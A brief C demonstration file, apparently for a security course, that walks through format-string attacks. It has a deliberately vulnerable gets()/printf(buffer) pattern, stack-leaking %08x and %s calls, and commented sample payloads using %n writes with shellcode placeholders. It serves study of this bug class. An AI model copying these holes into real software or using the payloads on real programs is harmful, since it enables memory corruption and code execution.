#include <stdio.h>

// Exploit by overflowing the buffer and using the %p mark
// to get the actual memory address.
// Ref: https://cs155.stanford.edu/papers/formatstring-1.2.pdf

int main () {

  // Check stack with %p
    char buffer [8];
    gets(buffer);
    printf(buffer);
    printf("\n");
  
  // Check with %s or use %n to write an address
    printf("%s%s%s%s%s%s%s%s%s%s%s%s");
    printf("\n");
  
  // View part of the stack as eight-digit padded-hexadecimal
    printf("%08x.%08x.%08x.%08x.%08x\n");
    printf("\n");

  // View a arbitrary address including %s. In this case: 0x08480110 (little endian)
    printf("\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|");
  
  /* Sample payloads
  %400s : "%497d\x3c\xd3\xff\xbf<nops><shellcode>"
        : "\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n"
  
  */
}
